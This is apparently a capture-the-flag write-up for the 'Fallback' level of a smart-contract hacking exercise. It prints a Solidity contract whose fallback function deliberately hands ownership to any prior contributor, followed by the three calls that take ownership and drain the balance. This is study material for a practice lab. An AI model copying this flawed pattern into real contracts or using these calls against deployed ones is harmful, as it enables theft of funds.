## 1. Fallback

Goals for this exercise are:

- Claim ownership of the contract
- Reduce its balance to 0


<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  fallback() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
~~~

<br/>

Plan is to call `contribute()` function which would add our address to `contributions` dictionary. 
With that we can call `fallback()` function and become `owner` address. 

<br/>

Needed calls were:

- `contract.contribute({value: 100})`
- `contract.sendTransaction({value: 1})`
- `contract.withdraw()`

